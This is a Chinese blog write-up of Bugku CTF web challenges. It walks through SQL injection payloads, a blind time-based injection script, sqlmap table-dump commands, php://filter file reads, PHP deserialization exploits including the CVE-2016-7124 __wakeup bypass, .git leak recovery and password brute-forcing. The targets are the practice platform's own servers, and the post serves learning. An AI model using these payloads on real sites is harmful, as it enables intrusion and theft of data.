---
title: Bugku论剑场WriteUp(Web)
date: 2019-10-28 19:10:05
categories:
  - CTF
---

自己第一次真正意义上开始练习CTF，收获很多，看来还是面向漏洞学习更有效率一点。。。
链接：<https://new.bugku.com/challenges/tag/web>

<!-- more -->

## web26

题目链接：[http://123.206.31.85:10026/](http://123.206.31.85:10026/)

![](https://hujiekang.top/images/uploads/big/7a4d05a9003ab2ddfbffc7e2725b830a.png)

先看看这个正则表达式`/\d+/sD`的含义：

![](https://hujiekang.top/images/uploads/big/4ddefd2b5a30a37ecd22b93c034e351c.png)

先是贪婪匹配数字，然后有两个模式限定符，`s`代表把换行符当作普通字符，即把整个字符串当作单行字符串看待；`D`表示Dollar符`$`只匹配至字符串的末尾而不是行末尾。也就是说$str不能包含数字，无论是在开头、末尾还是中间都不行。

于是尝试构造参数`num=1&str=a`看看会报什么错，发现直接出flag了，，，。。。？？？

![](https://hujiekang.top/images/uploads/big/d5cf9f801980f6a0ae7c86df9b11c800.png)

于是仔细一看，发现运算符`and`这里有问题。`and`和`&&`的运算优先级是不一样的，`&&`的优先级高于`=`，而`and`的优先级则低于`=`，所以在这里有效的只有赋值运算，后面的`and`运算由于没有变量来存放运算结果，等于没有。下表是PHP中运算符的优先级排序：

![](https://hujiekang.top/images/uploads/big/c9f8616e5c097718bebe69512abf2ff7.png)

这题真的奇葩。。。被甩flag甩的猝不及防。。。

## web1

题目链接：[http://123.206.31.85:10001/](http://123.206.31.85:10001/)

打开网页，里面就一张图片里面有一段PHP代码，很明显就是代码审计题了。

![](https://hujiekang.top/images/uploads/big/e5185acf3ad5c134f73c16b1d5aff610.png)

在这里第一次碰到`extract()`函数，下面是PHP Manual对这个函数的介绍：

> extract — 从数组中将变量导入到当前的符号表
> 本函数用来将变量从数组中导入到当前的符号表中。
> 检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。
>`extract( array &$array[, int $flags = EXTR_OVERWRITE[, string $prefix = NULL]] ) : int`

这个函数的必选参数是一个关联数组，函数的功能就是把这个关联数组转化为PHP程序中的变量，并检查是否与已存在变量存在冲突。关联数组里的键名为变量名，键值为变量值。

从这里来看，程序是默认把整个`$_GET`超全局数组的内容都转化为了变量，也就相当于可以通过`GET`方法传入变量。后面的`if`要求`$a`变量必须存在，且`$c`变量从`$b`变量对应的文件中读取内容。如果`$a`和`$c`的值相等，则输出flag。

显然服务器上的任何文件我们都是不知道内容的，于是无法通过读取真正的文件来满足要求。于是只能使用PHP伪协议`php://input`。令`POST`内容与变量`a`的内容相同即可得到flag。

![](https://hujiekang.top/images/uploads/big/d10d678c9bc13a5aa0ccf0d6a3d45358.png)
![](https://hujiekang.top/images/uploads/big/1469f908c7c892b2fb889c5934ef7841.png)

看了一下别人的WriteUp，只需要传入`a=`即可，因为使用`file_get_contents()`函数去读的文件如果不存在的话，那么会返回`false`。而空字符串与`false`做等于运算返回的是`true`，所以也可以打印出flag。

![](https://hujiekang.top/images/uploads/big/d3f9a5c7b6023fba497c57d3584b2445.png)

## web9

题目链接：[http://123.206.31.85:3031/](http://123.206.31.85:3031/)

页面打开只有一句话：

![](https://hujiekang.top/images/uploads/big/dffc824e50f78d558f9a25c3674bfffb.png)

这一行字直接暗示（明示）了一些信息：使用PUT方法发送信息bugku即可拿到flag。

使用BurpSuite修改请求头，拿到一段字符串：

![](https://hujiekang.top/images/uploads/big/c62976d81fa4bcf502022d6a77877147.png)

进行base64解密，得到flag：`flag{T7l8xs9fc1nct8NviPTbn3fG0dzX9V}`

## 流量分析

题目文件：[点击下载](https://o.hujiekang.top/downloads/01a25ea3fd6349c6e635a1d0196e75fb.pcapng)

下载下来是一个WireShark的抓包记录文件，使用WireShark打开，追踪TCP数据流即可拿到flag。

![](https://hujiekang.top/images/uploads/big/a61a3e0a4f3347b5bf65296e5571be4d.png)

flag：`flag{bugku123456}`

## web2

题目链接：[http://123.206.31.85:10002/](http://123.206.31.85:10002/)

![](https://hujiekang.top/images/uploads/big/180e4061a84cb469eeff0f13e2aa08cb.png)

网页产生了一个随机生成的算式，算式每3秒刷新一次。要求算出正确答案就可以拿到flag。

单靠算肯定是不行的，于是开始玩蛇，成功拿到flag：

```python
import requests
import re

session = requests.session()   # 创建session
r = session.get('http://123.206.31.85:10002/')   # 请求URL
formula = re.findall('<br/>\n(.*?)</p>', r.text,re.S)   # 通过正则表达式搜索算式
result = eval(formula[0])   # 使用eval()函数计算算式得到结果
r = session.post('http://123.206.31.85:10002/', data = {"result": result})   # 使用POST提交结果
print(r.text)
```

在匹配算式的时候，使用了`re.S`作为最后一个参数，使用`re.S`代表可以跨行匹配，而不使用则只能在单行内匹配。

![](https://hujiekang.top/images/uploads/big/0ca7974ebaaebe1c33b520f6ffb4e094.png)

## web6

题目链接：[http://123.206.31.85:10006/](http://123.206.31.85:10006/)

![](https://hujiekang.top/images/uploads/big/1dee641801d0b2b99e1fb265ea8ef5fc.png)

页面是一个登录框，随便输入密码提示`IP禁止访问，请联系本地管理员登陆，IP已被记录.`。

既然要联系本地管理员登录，不妨伪装成内网IP再登录试试：

![](https://hujiekang.top/images/uploads/big/64d73b4ebddbd226c94af9f86072b7d9.png)

网页提示用户凭据无效，说明这样可以正常登录，接下来只需要账户密码正确就能登录了。

一开始猜测是`SQL`注入，但是尝试了一些注入语句都没有任何反应，那就应该不是`SQL`注入了，于是尝试爆破密码，使用用户名为admin，密码使用[简单密码字典](https://github.com/duyetdev/bruteforce-database)进行爆破，搜索返回结果中含flag字符串的结果，一段时间后爆出密码为`test123456`。

![](https://hujiekang.top/images/uploads/big/e701eb9dcd4400241e9e7f739dc9cdc4.png)
![](https://hujiekang.top/images/uploads/big/72267f83c991540acfc5fc3a01d9b3cd.png)

**更新：看了一下别人的WriteUp，发现不用爆破。。。源代码最底下已经给了密码。。。**

![](https://hujiekang.top/images/uploads/big/435c582e9aa6f39d62c4fdffd51c7f7e.png)

## web11

题目链接：[http://123.206.31.85:3030/](http://123.206.31.85:3030/)

![](https://hujiekang.top/images/uploads/big/8d1a47002754c62c2300000effd0bb13.png)

标题是robots，于是尝试访问`robots.txt`，发现位置`/shell.php`：

![](https://hujiekang.top/images/uploads/big/f602ff768621f10b56c5aa226959cc67.png)
![](https://hujiekang.top/images/uploads/big/306c178bae377275ad8f89cfa6164e27.png)

访问之后发现一个md5计算的页面，要求填入的内容的md5值前六位等于指定数值。二话不说，玩蛇：

```python
import requests
import hashlib
# import string

def md5(key):
    m = hashlib.md5()
    m.update(key.encode('utf-8'))
    return m.hexdigest()

# 最开始尝试使用数字和字母结合的字符串去尝试，发现跑半天跑不出来，没想到单用数字就可以了
# dic = string.printable[:62]
# for i in dic:
#   for j in dic:
#     for k in dic:
#       for l in dic:
#         s = i + j + k + l
#         if md5(s)[:6] == 'dcbf93':
#           print(s)
#           exit()

for i in range(1000000):
    if md5(str(i))[:6] == 'dcbf93':
        print(i)
        break
```

程序运行结果如下：

![](https://hujiekang.top/images/uploads/big/5af5ff0b05b2128860f828beb9cc2bcc.png)

填入内容，拿到flag：

![](https://hujiekang.top/images/uploads/big/5d04ad4891c6996fa621e9dc50981e83.png)

## web13

题目链接：[http://123.206.31.85:10013](http://123.206.31.85:10013)

![](https://hujiekang.top/images/uploads/big/3b4839206231def48fe8b2f1121a0ac5.png)

打开网页有一个文本框，随便输入提交，返回Wrong Answer。查看HTML响应头，发现`Password`和`Hint`字段，`base64`解码`Password`后得到一串flag`flag{a480d2b70b629926fca14a5dee65abb4}`：

![](https://hujiekang.top/images/uploads/big/4b8939d6159c2fa2f3aba498b5e01676.png)

填入发现这个并不是真实的flag，于是尝试以这个为内容提交，返回的内容也是一样的。

这个时候考虑到还有Hint，Hint这是要求GKD？那不用手动提交，使用脚本提交会怎样？

```python
import requests
import base64

session = requests.session()
pwd = {"password": "123456"}
r = session.post("http://123.206.31.85:10013/index.php",data=pwd)
pwd1 = base64.b64decode(r.headers['password'])[5:-1]
r = session.post("http://123.206.31.85:10013/index.php",data={"password": pwd1})
print(r.text)
```

拿到flag：

![](https://hujiekang.top/images/uploads/big/1950471a2a11c17099c13b46f4c759b7.png)

## 日志审计

> 从日志中找出黑客攻击的痕迹
> 题目文件：[点击下载](downloads/a14390b0e361f66a2023baff01967b9f.log)

打开日志文件，看到所有请求的IP地址都是内网IP192.168.0.1和127.0.0.1，所以显然不能从这里得到任何信息。
大致浏览发现大部分请求都返回了`404`，很可能是一个扫描器在扫描网站目录。
搜索状态码`200`，发现加载页面的一些数据如JavaScript、css等返回了`200`之外，还有在访问`flag.php`的时候返回了`200`，而且很明显，在使用SQLMap进行`SQL`注入。把这几行进行URL解码：

![](https://hujiekang.top/images/uploads/big/6cfb226ab106f2b2a967fd7c8ad73ec5.png)
![](https://hujiekang.top/images/uploads/big/6a97228b53b6a4e8f401658f5ed14d6a.png)


发现了`ORD(xxx)=数字`形式的代码，`ord()`函数是用于把字符转为ASCII码的，所以尝试把后面的数字当作ASCII码转回字符：

```python
asc = [102, 108, 97, 103, 123, 109, 97, 121, 97, 104, 101, 105, 49, 57, 54, 53, 97, 101, 55, 53, 54, 57, 125]
for each in asc:
    print(chr(each), end="")
```

得到flag：`flag{mayahei1965ae7569}`

## web20

题目链接：[http://123.206.31.85:10020/](http://123.206.31.85:10020/)

![](https://hujiekang.top/images/uploads/big/f18c5cf23303ab9500c9b04ad272ea44.png)

题目给了一串动态密文，每刷新一次就会变化，并且还说`GET`提交密文就可以得到flag。

二话不说，上脚本，直接拿到flag：

```python
import requests
import re

while(True):
    s = requests.session()
    r = s.get("http://123.206.31.85:10020")
    code = re.findall("[0-9a-z]+",r.text)
    r = s.get("http://123.206.31.85:10020/?key="+code[0])
    r.encoding="utf-8"
    print(r.text)
```

![](https://hujiekang.top/images/uploads/big/500cbd21113defa17158e0680661680b.png)

这里不能仅仅提交一次，得多次提交才能出flag。可能密文里还有什么规律？研究一下再更新8。

## web25

题目链接：[http://123.206.31.85:10025/](http://123.206.31.85:10025/)

![](https://hujiekang.top/images/uploads/big/ce4b8ad05821ca8d4a18752d05d74fbc.png)

点击xiazai按钮，跳转到`xiazai.html`，点击看不懂的链接，显示未发现文件。查看文件链接为`http://123.206.31.85:10025/2/ziidan.txt`，是一个文本文件，尝试去掉链接中的`/2`再次访问，得到文件`ziidan.txt`。

![](https://hujiekang.top/images/uploads/big/a02b3c5951b57b943ffc66844f066510.png)

看着像是一个字典文件，尝试使用这个作为字典对主页进行爆破提交，发现均返回wrong。

那这个字典有什么用呢？难道还有别的地方提交数据吗？于是使用扫描器扫描站点，发现果然还有一个`shell.php`：

![](https://hujiekang.top/images/uploads/big/7b5bf9225d3a0d84ba7eddc7e9bb8bd2.png)

打开再次爆破提交，得到flag：

![](https://hujiekang.top/images/uploads/big/bde5bb8290f7b1acb03eb69086b72785.png)

## web3

题目链接：[http://123.206.31.85:10003/](http://123.206.31.85:10003/)

![](https://hujiekang.top/images/uploads/big/6e9d48ebf473a27d0f0feb28f8491e3e.png)

点击链接，进入一个上传页面，同时发现有一个get参数op，立马想到文件包含漏洞。
构造参数`op=php://filter/convert.base64-encode/resource=flag`拿到base64编码字符串，解密后得到flag。

![](https://hujiekang.top/images/uploads/big/1e88d03c955bbd39d496365acd30328c.png)

## web4

题目链接：[http://123.206.31.85:10004/](http://123.206.31.85:10004/)

![](https://hujiekang.top/images/uploads/big/f36d4d37fbd0bb54d4587a40297615ed.png)

最简单的SQL注入，输入用户名`1' or '1'='1'#`，密码留空直接提交拿到flag：

![](https://hujiekang.top/images/uploads/big/977f94ca7f37beb8c6d8797565c1f436.png)

## web15

题目链接：[http://123.206.31.85:10015/](http://123.206.31.85:10015/)

> vim编辑器

![](https://hujiekang.top/images/uploads/big/85f4f3e4242ca3005eb6e81b8fea2837.png)

题目给了vim编辑器字样，于是想到临时文件.swp。尝试访问.1ndex.php.swp、1ndex.php.swp、1ndex.swp、.1ndex.swp、.index.php.swp、index.php.swp、.index.swp、index.swp均返回404。于是输入swp提交，返回`不是这里不是这里不是这里!!!`

于是无意中把1ndex.php改成index.php，flag就跑出来了。。。。。。

![](https://hujiekang.top/images/uploads/big/30bce7265772fb77cc6fe8edadf819a3.png)

不知道这题要考什么。。。

## web5

题目链接：<http://6fe97759aa27a0c9.bugku.com/>

这是一道简单的SQL注入，刚好最近刷了DVWA，环境和DVWA中的差不多一致，纯当给自己练练手了。

![](https://hujiekang.top/images/uploads/big/019002d3f6248b724ca22e6710ce4f04.png)

主界面是一个十分简陋的留言板，默认有两条留言flag和1，点进去果然没有什么有价值的信息，新建留言也显示创建失败，删除也删除不掉这样子。

随后发现详细留言界面`http://6fe97759aa27a0c9.bugku.com/?mod=read&id=1`有一个可能存在注入的参数`id`，尝试是否可以注入：

1. `id=1 and 1=1`得到正常返回，而`id=1 and 1=2`提示no data错误，说明存在数字型注入；
2. 随后猜表列数，`id=1 order by 5`时返回错误，说明表有4列；
3. 接下来爆表名，`id=0 union select null,group_concat(table_name),null,null from information_schema.tables where table_schema=database()`（由于仅显示一条记录，所以要让`union`查询的前面查询不到东西才能让后面的查询显示），拿到表名`flag,posts,users`；
4. 然后爆列名，`id=0 union select null,group_concat(column_name),null,null from information_schema.columns where table_name='flag'`，拿到列名`flag`；
5. 开始拿数据，`id=0 union select null,group(flag),null,null from flag`拿到flag：

![](https://hujiekang.top/images/uploads/big/13b9668a109922dc327bd1b3a628583c.png)

## web18

题目链接：<http://123.206.31.85:10018/>

一个稍微绕了点的SQL注入。。。主界面映入眼帘的除了个导航栏啥也没有，右上有一个假搜索框，左上还有一个List按钮，点击可以出现一段文字：

![](https://hujiekang.top/images/uploads/big/23f5e9d897cd882b0878217e1e74053a.png)
![](https://hujiekang.top/images/uploads/big/e3ae839224c61f3557b25b3910c8a0d8.png)

注意到可控制参数`id`，但是按上一题的方法尝试，发现使用字符型+and条件，总是不返回数据；而用数字型+and条件，则总是返回数据，添加注释符`#`、`--`也没用。于是初步判断为字符型注入。

后来受[这篇文章](https://www.cnblogs.com/laoxiajiadeyun/p/10274780.html)的启发，并查阅[MySQL官方文档](https://dev.mysql.com/doc/refman/8.0/en/comments.html)发现，`--`注释作用的条件是`--`后必须跟一个空格或控制字符（空格、制表符、换行符等）。而在URL中`+`被解码为空格，所以`--+`可以成功注释。除此之外，使用`--'`闭合掉所有的引号也可以成功注释。

于是尝试`id=1'--+`，发现返回数据，说明存在字符型注入：

![](https://hujiekang.top/images/uploads/big/18e2ddf20f4f9dfd277d23bd747f2eb0.png)

但是又发现一个问题：`id=1' and 1=1--+`也不返回数据。此时条件成立，且注释掉了后面的部分，于是想到`and`被过滤：

尝试`id=1'and--+`发现正常返回数据，说明`and`被过滤了。如法炮制，可以发现`or`、`select`、`union`也被过滤。

于是，绕开所有的坑，就可以向上面一样开心的玩耍了：

1. 猜表列数，`id=1' ununionion selselectect null,null,null--+`返回数据，说明表列数3；
2. 爆表名
   ![](https://hujiekang.top/images/uploads/big/5195558e298b6cb17635da19b307a190.png)
3. 爆列名
   ![](https://hujiekang.top/images/uploads/big/49278d5a9205aa827c9e4bc358fa3ba0.png)
4. 拿数据
   ![](https://hujiekang.top/images/uploads/big/0fad50bd495bb2ed31a755f9bb5f3076.png)

## web14

题目链接：<http://123.206.31.85:10014/>

![](https://hujiekang.top/images/uploads/big/c2bbcb8fde442cd06083d1493ed2a8cf.png)

打开就一个403页面，除此之外没有任何信息，查看网页源代码发现这是个假的403，注释提示要善于发现：

![](https://hujiekang.top/images/uploads/big/491af926ab22773da5a4552b07377341.png)

然而我发现了半天也没发现出个啥，于是求助百度，于是发现是`/.git`目录泄露，可以使用 [GitHack](https://github.com/lijiejie/GitHack) 或 [Git_Extract](https://github.com/gakki429/Git_Extract) 实现从`/.git`目录中恢复源文件的目的（下图以Git_Extract为例）

![](https://hujiekang.top/images/uploads/big/2d79b93d41541e7054afc15f3bf1b236.png)

于是就恢复出了源文件`index.php`和`flag.php`，直接拿到flag：

```php

// index.php
<?php
echo "I Think Git Is Very NB!!!";
?>

//flag.php
flag{GitIsAFreeVessionControlSyStem}
```

## web21

题目链接：<http://123.206.31.85:10021/>

![](https://hujiekang.top/images/uploads/big/56c8691c15b0c2b6ae2a4bc924ac3cc5.png)

打开页面提示你不是尊贵的admin所以啥都没有，但是查看源代码后发现了如何成为尊贵的admin：

![](https://hujiekang.top/images/uploads/big/1b58db86c3880c614f6ec52f4fecec8c.png)

于是知道了，只需要通过`php://input`伪协议来传入`user`参数，就可以成为尊贵的admin了。除此之外注释中还暗示读取`class.php`，于是想到通过`php://filter`来读取：

![](https://hujiekang.top/images/uploads/big/9b1a500f41ef5ba31136c6806570b50c.png)

同理读出`index.php`，完整源码如下：

```php

//class.php
<?php
error_reporting(E_ALL & ~E_NOTICE);

class Read{//f1a9.php
    public $file;
    public function __toString(){
        if(isset($this->file)){
            echo file_get_contents($this->file);
        }
        return "__toString was called!";
    }
}
?>

//index.php
<?php
error_reporting(E_ALL & ~E_NOTICE);
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    if(preg_match("/f1a9/",$file)){
        exit();
    }else{
        include($file); //class.php
        $pass = unserialize($pass);
        echo $pass;
    }
}else{
    echo "you are not admin ! ";
}

?>

<!--
$user = $_GET["user"];
$file = $_GET["file"];
$pass = $_GET["pass"];

if(isset($user)&&(file_get_contents($user,'r')==="admin")){
    echo "hello admin!<br>";
    include($file); //class.php
}else{
    echo "you are not admin ! ";
}
-->
```

于是变成了一道反序列化的题目。flag应该在`f1a9.php`里面，但是由于正则表达式不能够直接读，只能通过序列化的对象来读取。
构造PHP代码如下：

```php
<?php
class Read{
    public $file;
}
$r = new Read();
$r->file = "f1a9.php";
echo serialize($r)
?>

// Output: O:4:"Read":1:{s:4:"file";s:8:"f1a9.php";}
```

于是通过`pass`参数传入序列化对象，通过`file`参数将`class.php`引入，就可以拿到flag了：

![](https://hujiekang.top/images/uploads/big/ebcdfef92dc76d9ff66a07eb60a65464.png)

## web19

题目链接：<http://123.206.31.85:10019/>

这题有点难度。。。不过也学到了不少东西

![](https://hujiekang.top/images/uploads/big/8695c6f40683954157c8151800ea3a52.png)

页面显示是一对男女的的爱情日记（谈恋爱之前还要先社工别人是真的狼灭），翻遍了也是没有找到什么信息。。。
然后把电脑里能用的工具全部用了一遍，结果发现又是`/.git`泄露：

![](https://hujiekang.top/images/uploads/big/e438b14da28d081972af6c5b3e16f2f1.png)

然后就找到一个文本文件`flag.txt`，发现了第一个提示：

> *Hint 1: flag is in /eXpl0ve5p0cVeRymuCh*

然后访问这个目录，发现一个登录框：

![](https://hujiekang.top/images/uploads/big/1d545e4acc55e3138add82dd1964904f.png)

初步判断是SQL注入叭，然后就随便试探了一下，发现无论是`and`、`or`、还是`union`，无论条件成立还是不成立，都没有回显。。。
所以只能延时盲注了。。。

用SQLMap开扫：

![猜数据库名](https://hujiekang.top/images/uploads/big/b43ded653faa714ff057bb7a18bb806d.png)

![猜表名](https://hujiekang.top/images/uploads/big/fafbb08e3742032f7daab0f9c5f05b58.png)

到这里接下来本来要猜列名的，但是这里SQLMap死活注入不成，然后我就自己写了个小脚本试了一下，发现是网站挂了。。。而且神奇的是只有猜列名的时候挂。。。

![](https://hujiekang.top/images/uploads/big/1c418c00820a00fbb2ea75ff77a899a0.png)

下面是代码：

```python
import requests

header = { ...... } # 自行填写

url = "http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php"
ascii_dict = list(range(32, 127))
params = {
    'username': '',
    'password': ''
}

print("Start attacking")
print("URL: "+url)

for i in range(101):
    for each in ascii_dict:
        params['username'] = "admin' and if(ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name='web19' limit 0,1),%s,1))=%s,sleep(5),1) #" %(str(i),str(each))
        r = requests.post(url, data=params, headers=header)
        print(r.status_code, chr(each))
```

于是就只能求助百度，找到了列名，再次使用SQLMap挖到了数据：

![hlnt_2表的数据](https://hujiekang.top/images/uploads/big/ebcb619785c8f8e2cfd43372ea5ba628.png)

![user表的数据](https://hujiekang.top/images/uploads/big/6bd50e6e138a54036e10b04eb5a1c7b6.png)

```bash
# 猜数据库名
❯❯❯ python .\sqlmap.py -u "http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php" --forms --dbs

# 猜表名
❯❯❯ python .\sqlmap.py -u "http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php" -D web19 --forms --tables

# 猜列名
❯❯❯ python .\sqlmap.py -u "http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php" -D web19 -T user --forms --columns
❯❯❯ python .\sqlmap.py -u "http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php" -D web19 -T hlnt_2 --forms --columns

# 猜数据
❯❯❯ python .\sqlmap.py -u "http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php" -D web19 -T user -C "username,password" --forms --dump
❯❯❯ python .\sqlmap.py -u "http://123.206.31.85:10019/eXpl0ve5p0cVeRymuCh/index.php" -D web19 -T hlnt_2 -C "hInt" --forms --dump
```

可以看见`user`表中有登录的用户名和密码，`hlnt_2`表中有第二条提示，是一个链接 <https://postimg.cc/6274vCP5>，打开是个图片：

![](https://i.postimg.cc/1tBGbHc6/2019-01-04-2-35-47.png)

难道又是个反序列化的东西？
登陆进去之后除了三条游记以及源代码中的一条注释之外，也没啥东西。。。。。至此再次懵逼

![](https://hujiekang.top/images/uploads/big/51188bfdac98e3ac3bfeff4ab0d1d20d.png)

于是就又求助了百度，发现有个东西叫 [snow HTML隐写](http://www.darkside.com.au/snow/)，也就刚好和游记中的**“雪”**对上了。
然后用Burp把整个网页保存下来（亲测直接用浏览器保存没用），使用`snow`找到flag位置：

![](https://hujiekang.top/images/uploads/big/541b2d654e6e432783d8d364871484bf.png)

访问`http://123.206.31.85:10019/PPPPOOO0CCCC.php`，发现毛都没有，于是想到之前那张反序列化的代码图片，又在游记那儿到处乱翻了一哈，发现一个反序列化的对象藏在Cookie里面：

![](https://hujiekang.top/images/uploads/big/a174603fa6412cc7e4454cf77b279e87.png)

把反序列化对象改成`O:8:"ReadFile":1:{s:4:"file";s:20:"/../PPPPOOO0CCCC.php";}`后发包，就拿到flag了（Cookie中要进行URL编码）：

![](https://hujiekang.top/images/uploads/big/e8abd239eacce8ef04ca0947648945d6.png)

## web24

题目链接：<http://123.206.31.85:10024/>

题目进去就是一个商城的界面，吸取前面不认真看的教训，这次把源代码全翻了一遍，果然所有的链接都是假的，而且果然最底下发现了一条注释。。。&#x1F605;

![](https://hujiekang.top/images/uploads/big/1019638d9574ac3ca39da6c71d93e73d.png)

访问`http://123.206.31.85:10024/index/index.php`，发现是代码审计：

![](https://hujiekang.top/images/uploads/big/3b4e8a6f4c7a213c28991e8b9ec63e39.png)

说白了，就是要绕过这个`__wakeup()`方法，防止对象的`file`属性被更改。
根据[漏洞CVE-2016-7124](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124)的叙述，如果存在`__wakeup()`方法，调用 `unserilize()` 方法前则先调用`__wakeup()`方法，但是序列化字符串中**表示对象属性个数的值大于真实的属性个数时**会跳过`__wakeup()`的执行。具体复现可以查看[这篇文章](https://www.cnblogs.com/zy-king-karl/p/11436872.html)。

那么接下来就直接开始整：
首先用base64输出序列化对象（考虑到私有属性会在序列化对象中加入控制字符）：

```php
$s = new Small_white_rabbit("the_f1ag.php");
echo base64_encode(serialize($s));
// Output: TzoxODoiU21hbGxfd2hpdGVfcmFiYml0IjoxOntzOjI0OiIAU21hbGxfd2hpdGVfcmFiYml0AGZpbGUiO3M6MTI6InRoZV9mMWFnLnBocCI7fQ==
```

然后用Burp搞一哈：

![](https://hujiekang.top/images/uploads/big/a698f0d00c24c9e5a0c450ea2d3a1071.png)

把输出加给`var`参数，提交，拿到flag：

![](https://hujiekang.top/images/uploads/big/bebbbf575960573ae7ca7041f9aa09c3.png)

## web23

题目链接：<http://123.206.31.85:10023/>

![](https://hujiekang.top/images/uploads/big/a98f6b961ddaffb435ec7b91f04a8a95.png)

开始还是不知道从哪里入手，于是就乱搞，用御剑扫一扫发现`/readme.txt`（内容如下）和`/admin/login.php`，推测是登录窗口，验证码应该指的也是这里。

> *网站默认登录用户名和密码为*
> *admin*
> *123*
> *用户登录后可自行修改密码*
> *密码只支持3位数字*
>
> *你也想学php验证码啊*
> *http://123.206.31.85:10023/1.png*

访问这个链接，发现图片内容是一种绕过验证码的方法。既然都明确告诉你咋整了，那就对着来就行了。
首先抓包，修改PHPSESSIONID为其他任意值，然后用户名admin，密码123，验证码不填直接登录，结果返回用户名或密码错误。。。

然后在`/readme.txt`中发现了可以自行修改密码的信息，那么应该密码被修改了，不是123了。
那就直接爆破叭：

![](https://hujiekang.top/images/uploads/big/94f67752cf83b3b482a333e96848dd7e.png)

## web16

题目链接：<http://123.206.31.85:1616/>

![](https://hujiekang.top/images/uploads/big/772d96a8037cf73a52b7e3775b022ee4.png)

这题目就是一个修炼小游戏，你可以修炼、赚钱、买东西，然后最后打boss。
开始游戏，确认角色属性之后进入主界面，提示练功和赚钱都需要五秒，而且赚钱一次100两，然而买一个东西要10000两打底。。。

那显然就走歪路叭。。。谁也不愿意在这里点几百次
查看源代码，引入了三个外部js：`md5.js`、`base64.js`和主程序`script.js`。

```js
// script.js
eval(function(p,a,c,k,e,r){e=function(c){return(c<62?'':e(parseInt(c/62)))+((c=c%62)>35?String.fromCharCode(c+29):c.toString(36))};if('0'.replace(0,e)==0){while(c--)r[e(c)]=k[c];k=[function(e){return r[e]||e}];e=function(){return'[57-9abd-hj-zAB]'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('7 s(t){5 m=t+"=";5 8=9.cookie.n(\';\');o(5 i=0;i<8.d;i++){5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)}p""}7 w(a){5 x=new Base64();5 q=x.decode(a);5 r="";o(i=0;i<q.d;i++){5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)}p r}7 ertqwe(){5 y="user";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\';\');5 e="";o(i=0;i<8.d;i++){u(-1<8[i].v("A")){e=8[i+1].n(":")[2]}}e=e.B(\'"\',"").B(\'"\',"");9.write(\'<img id="f-1" g="h/1-1.k">\');j(7(){9.l("f-1").g="h/1-2.k"},1000);j(7(){9.l("f-1").g="h/1-3.k"},2000);j(7(){9.l("f-1").g="h/1-4.k"},3000);j(7(){9.l("f-1").g="h/6.png"},4000);j(7(){alert("你使用如来神掌打败了蒙老魔，但不知道是真身还是假身，提交试一下吧!A{"+md5(e)+"}")},5000)}',[],38,'|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'.split('|'),0,{}))
```

一堆奇奇怪怪的变量，完全没有可读性，于是查找资料发现这里使用了 [packer JS代码混淆](http://tool.chinaz.com/js.aspx)，解密之后得到如下代码：

```js
// Decrypted script.js
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length, c.length)
    }
    return ""
}

function decode_create(temp) {
    var base = new Base64();
    var result = base.decode(temp);
    var result3 = "";
    for (i = 0; i < result.length; i++) {
        var num = result[i].charCodeAt();
        num = num ^ i;
        num = num - ((i % 10) + 2);
        result3 += String.fromCharCode(num)
    }
    return result3
}

function ertqwe() {
    var temp_name = "user";
    var temp = getCookie(temp_name);
    temp = decodeURIComponent(temp);
    var mingwen = decode_create(temp);
    var ca = mingwen.split(';');
    var key = "";
    for (i = 0; i < ca.length; i++) {
        if (-1 < ca[i].indexOf("flag")) {
            key = ca[i + 1].split(":")[2]
        }
    }
    key = key.replace('"', "").replace('"', "");
    document.write('<img id="attack-1" src="image/1-1.jpg">');
    setTimeout(function() {
        document.getElementById("attack-1").src = "image/1-2.jpg"
    }, 1000);
    setTimeout(function() {
        document.getElementById("attack-1").src = "image/1-3.jpg"
    }, 2000);
    setTimeout(function() {
        document.getElementById("attack-1").src = "image/1-4.jpg"
    }, 3000);
    setTimeout(function() {
        document.getElementById("attack-1").src = "image/6.png"
    }, 4000);
    setTimeout(function() {
        alert("你使用如来神掌打败了蒙老魔，但不知道是真身还是假身，提交试一下吧!flag{" + md5(key) + "}")
    }, 5000)
}
```

可以看见这三个函数，第一个函数用于获取Cookie的值，第二个函数用户对一个字符串进行编码，第三个函数就和flag有关了，具体干嘛的还不知道。
读取网页Cookie发现`PHPSESSIONID`和`user`两项，把`user`项按程序中的流程去解密，得到了一个PHP序列化对象：

![](https://hujiekang.top/images/uploads/big/cf2182565dbbec2079c58598b42d2386.png)

这个序列化对象存有现在人物的所有信息，所以直接把对象中的数据修改了之后再反向编码回去，应该就可以直接修改数据了叭。

于是我用JS写了一个`encode_create()`函数，函数流程就是`decode_create()`反过来：

```js
function encode_create(temp) {
    var base = new Base64();
    var result3 = "";
    for (i = 0; i < temp.length; i++) {
        var num = temp[i].charCodeAt();

        num = num + ((i % 10) + 2);
        num = num ^ i;
        document.write(num + " ");
        result3 += String.fromCharCode(num)
    }
    var result = base.encode(result3);
    return result
}
```

但是使用这个函数输出的东西没法用。。。于是我又用PHP写了一遍：

```php
<?php
